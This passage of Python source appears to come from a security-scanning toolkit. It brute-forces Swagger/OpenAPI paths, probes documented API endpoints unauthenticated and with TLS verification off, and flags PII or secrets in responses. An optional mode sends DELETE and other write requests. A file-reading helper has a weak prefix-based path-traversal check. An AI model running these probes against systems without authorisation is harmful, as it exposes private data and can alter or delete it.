            spec = _try_fetch_spec(target_url, client)
            if spec is not None:
                version = spec.get("openapi") or spec.get("swagger", "?")
                info = spec.get("info") or {}
                endpoints = _parse_spec_endpoints(spec)
                candidate_spec_urls.append(target_url)
                discovered_specs.append({
                    "url": target_url,
                    "version": version,
                    "title": info.get("title", ""),
                    "endpoint_count": len(endpoints),
                    "phase": "direct",
                })
                all_endpoints.extend(endpoints)
                logger.info(f"swagger_discovery: direct spec at {target_url} ({len(endpoints)} endpoints)")

        # Phase 2: Swagger UI scraping
        if not discovered_specs:
            for ui_path in _SWAGGER_UI_PATHS:
                ui_url = base_origin + ui_path
                spec_url = _scrape_swagger_ui_for_spec_url(ui_url, client)
                if spec_url and spec_url not in candidate_spec_urls:
                    spec = _try_fetch_spec(spec_url, client)
                    if spec is not None:
                        version = spec.get("openapi") or spec.get("swagger", "?")
                        info = spec.get("info") or {}
                        endpoints = _parse_spec_endpoints(spec)
                        candidate_spec_urls.append(spec_url)
                        discovered_specs.append({
                            "url": spec_url,
                            "scraped_from": ui_url,
                            "version": version,
                            "title": info.get("title", ""),
                            "endpoint_count": len(endpoints),
                            "phase": "ui_scrape",
                        })
                        all_endpoints.extend(endpoints)
                        logger.info(f"swagger_discovery: UI scrape found spec at {spec_url} ({len(endpoints)} endpoints)")
                        break

        # Phase 3: Common-path bruteforce
        for spec_path in _SWAGGER_SPEC_PATHS:
            spec_url = base_origin + spec_path
            if spec_url in candidate_spec_urls:
                continue
            spec = _try_fetch_spec(spec_url, client)
            if spec is not None:
                version = spec.get("openapi") or spec.get("swagger", "?")
                info = spec.get("info") or {}
                endpoints = _parse_spec_endpoints(spec)
                candidate_spec_urls.append(spec_url)
                discovered_specs.append({
                    "url": spec_url,
                    "version": version,
                    "title": info.get("title", ""),
                    "endpoint_count": len(endpoints),
                    "phase": "bruteforce",
                })
                all_endpoints.extend(endpoints)
                logger.info(f"swagger_discovery: bruteforce found spec at {spec_url} ({len(endpoints)} endpoints)")
                # Don't break — collect all specs

    # Submit findings to ASM bridge
    for spec_info in discovered_specs:
        bridge.submit_finding(Finding(
            host=parsed_target.netloc,
            title=f"Exposed API Spec: {spec_info.get('title') or spec_info['url']}",
            description=(
                f"OpenAPI/Swagger spec discovered at {spec_info['url']} "
                f"(version: {spec_info.get('version', '?')}, "
                f"{spec_info.get('endpoint_count', 0)} endpoints documented, "
                f"discovered via {spec_info.get('phase', 'unknown')} phase)"
            ),
            severity="info",
            tool="swagger_spec_discovery",
            url=spec_info["url"],
        ))
    bridge.flush()

    return {
        "success": True,
        "specs_found": len(discovered_specs),
        "specs": discovered_specs,
        "spec_urls": candidate_spec_urls,
        "endpoints": all_endpoints,
        "endpoint_count": len(all_endpoints),
        "target": target_url,
        "base_origin": base_origin,
    }


def run_autoswagger(
    target_url: str,
    bridge: ASMBridge,
    risk: bool = False,
    all_codes: bool = False,
    brute: bool = False,
    rate: int = 20,
    timeout: int = 300,
) -> Dict[str, Any]:
    """
    Run AutoSwagger (intruder-io/autoswagger) against target_url.

    AutoSwagger discovers OpenAPI/Swagger specs, exercises each documented
    endpoint, and flags responses containing PII or secrets. When autoswagger
    is not installed this function falls back to a native httpx implementation
    that tests GET endpoints from a previously discovered spec.

    Args:
        target_url: Base URL or direct spec URL of the target API
        risk:       Include non-GET (POST/PUT/DELETE) requests (autoswagger -risk)
        all_codes:  Include all HTTP status codes except 401/403 (autoswagger -all)
        brute:      Enable exhaustive parameter value testing (autoswagger -b)
        rate:       Max requests per second (autoswagger -rate)
        timeout:    Subprocess / overall timeout in seconds
    """
    import httpx

    parsed_target = urlparse(target_url)
    base_origin = f"{parsed_target.scheme}://{parsed_target.netloc}"
    host = parsed_target.netloc

    # Try autoswagger CLI first (subprocess approach, consistent with other tools)
    autoswagger_bin = shutil.which("autoswagger") or shutil.which("autoswagger.py")
    if autoswagger_bin is None:
        # Try well-known install location
        for candidate in [
            "/opt/autoswagger/autoswagger.py",
            "/usr/local/lib/autoswagger/autoswagger.py",
            os.path.expanduser("~/autoswagger/autoswagger.py"),
        ]:
            if os.path.isfile(candidate):
                autoswagger_bin = candidate
                break

    if autoswagger_bin:
        cmd = ["python3", autoswagger_bin, target_url, "-json", "-stats"]
        if risk:
            cmd.append("-risk")
        if all_codes:
            cmd.append("-all")
        if brute:
            cmd.append("-b")
        if rate != 30:
            cmd.extend(["-rate", str(rate)])

        try:
            logger.info(f"autoswagger: running {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            raw = (result.stdout or "").strip()
            if raw:
                try:
                    data = json.loads(raw)
                    endpoints_tested = data.get("results", [])
                    stats = data.get("stats", {})
                    findings: List[Dict] = []
                    for ep in endpoints_tested:
                        pii = ep.get("pii", [])
                        secrets = ep.get("secrets", [])
                        if pii or secrets or ep.get("flagged"):
                            severity = "high" if secrets else "medium"
                            desc = (
                                f"Unauthenticated endpoint {ep.get('method','GET')} {ep.get('url','')} "
                                f"returned HTTP {ep.get('status_code','?')} with "
                                + (f"PII: {pii}" if pii else "")
                                + (f" Secrets: {secrets}" if secrets else "")
                            )
                            findings.append({
                                "url": ep.get("url", ""),
                                "method": ep.get("method", "GET"),
                                "status": ep.get("status_code"),
                                "pii": pii,
                                "secrets": secrets,
                                "severity": severity,
                            })
                            bridge.submit_finding(Finding(
                                host=host,
                                title=f"API Data Exposure: {ep.get('method','GET')} {ep.get('url','')}",
                                description=desc,
                                severity=severity,
                                tool="autoswagger",
                                url=ep.get("url", ""),
                            ))
                    bridge.flush()
                    return {
                        "success": True,
                        "tool": "autoswagger_cli",
                        "target": target_url,
                        "endpoints_tested": len(endpoints_tested),
                        "flagged_endpoints": findings,
                        "stats": stats,
                    }
                except json.JSONDecodeError:
                    pass
            logger.warning(f"autoswagger: no JSON output; stderr={result.stderr[:500]}")
        except subprocess.TimeoutExpired:
            logger.warning("autoswagger: subprocess timed out")
        except Exception as e:
            logger.error(f"autoswagger subprocess error: {e}")

    # Native fallback — discover the spec then probe each endpoint
    logger.info("autoswagger: falling back to native httpx endpoint tester")
    discovery = run_swagger_spec_discovery(target_url, bridge, timeout=min(timeout, 60))
    if not discovery.get("specs"):
        return {
            "success": False,
            "tool": "native_fallback",
            "error": "No OpenAPI/Swagger spec found — install autoswagger for spec-less testing",
            "discovery": discovery,
        }

    spec_urls = discovery.get("spec_urls", [])
    all_documented_endpoints = discovery.get("endpoints", [])
    tested: List[Dict] = []
    flagged: List[Dict] = []

    http_methods_to_test = ["GET"]
    if risk:
        http_methods_to_test += ["POST", "PUT", "PATCH", "DELETE"]

    with httpx.Client(
        headers={"User-Agent": "AegisVanguard-AutoSwagger/1.0"},
        verify=False,
        timeout=15,
        follow_redirects=True,
    ) as client:
        for ep in all_documented_endpoints:
            method = ep.get("method", "GET")
            if method not in http_methods_to_test:
                continue
            full_path = ep.get("full_path") or ep.get("path", "")
            url = base_origin + full_path
            try:
                resp = client.request(method, url)
                status = resp.status_code
                body = resp.text[:10000]
                ct = resp.headers.get("content-type", "")

                # Skip auth-gated responses unless all_codes requested
                if not all_codes and status in (401, 403):
                    tested.append({"url": url, "method": method, "status": status, "skipped": True})
                    continue

                data_hits = _scan_response_for_pii_and_secrets(body)
                is_large = len(body) > 5000 and "json" in ct.lower()

                entry: Dict[str, Any] = {
                    "url": url,
                    "method": method,
                    "status": status,
                    "content_type": ct,
                    "response_size": len(body),
                    "pii": {k: v for k, v in data_hits.items() if k.startswith("pii:")},
                    "secrets": {k: v for k, v in data_hits.items() if k.startswith("secret:")},
                    "large_response": is_large,
                    "operation": ep.get("operation_id", ""),
                    "summary": ep.get("summary", ""),
                }
                tested.append(entry)

                if entry["pii"] or entry["secrets"] or (is_large and 200 <= status < 300):
                    severity = "high" if entry["secrets"] else ("medium" if entry["pii"] else "low")
                    flagged.append(entry)
                    desc_parts = [f"Endpoint {method} {url} (HTTP {status}) returned data of interest:"]
                    if entry["pii"]:
                        desc_parts.append(f"  PII: {list(entry['pii'].keys())}")
                    if entry["secrets"]:
                        desc_parts.append(f"  Secrets: {list(entry['secrets'].keys())}")
                    if is_large:
                        desc_parts.append(f"  Large JSON response ({len(body)} bytes) — potential bulk data exposure")
                    bridge.submit_finding(Finding(
                        host=host,
                        title=f"API Data Exposure: {method} {full_path}",
                        description="\n".join(desc_parts),
                        severity=severity,
                        tool="autoswagger_native",
                        url=url,
                    ))
            except Exception as exc:
                tested.append({"url": url, "method": method, "error": str(exc)})

    bridge.flush()
    return {
        "success": True,
        "tool": "native_fallback",
        "target": target_url,
        "spec_urls": spec_urls,
        "endpoints_documented": len(all_documented_endpoints),
        "endpoints_tested": len(tested),
        "flagged_count": len(flagged),
        "flagged_endpoints": flagged,
        "all_results": tested,
    }


def read_source_file(
    path: str,
    start_line: int = 1,
    num_lines: int = 30,
    source_dir: Optional[str] = None,
) -> Dict[str, Any]:
    """Read lines from a source file with bounds checking."""
    # Resolve path — may be relative to source_dir or absolute
    if source_dir and not os.path.isabs(path):
        full_path = os.path.realpath(os.path.join(source_dir, path))
        # Jail to source_dir to prevent path traversal
        real_source = os.path.realpath(source_dir)
        if not full_path.startswith(real_source):
            return {"error": "Path traversal outside source_dir denied"}
    else:
        full_path = os.path.realpath(path)

    if not os.path.isfile(full_path):
        return {"error": f"File not found: {path}"}
    if os.path.getsize(full_path) > 5 * 1024 * 1024:
        return {"error": "File too large (> 5 MB). Use grep_source for targeted searches."}

    try:
        with open(full_path, "r", errors="ignore") as fh:
            all_lines = fh.readlines()
    except Exception as exc:
        return {"error": str(exc)}

    total = len(all_lines)
    start = max(1, start_line)
    end = min(total, start + num_lines - 1)
    selected = all_lines[start - 1: end]

    return {
        "path": path,
        "total_lines": total,
        "start_line": start,
        "end_line": end,
        "content": "".join(selected),
    }
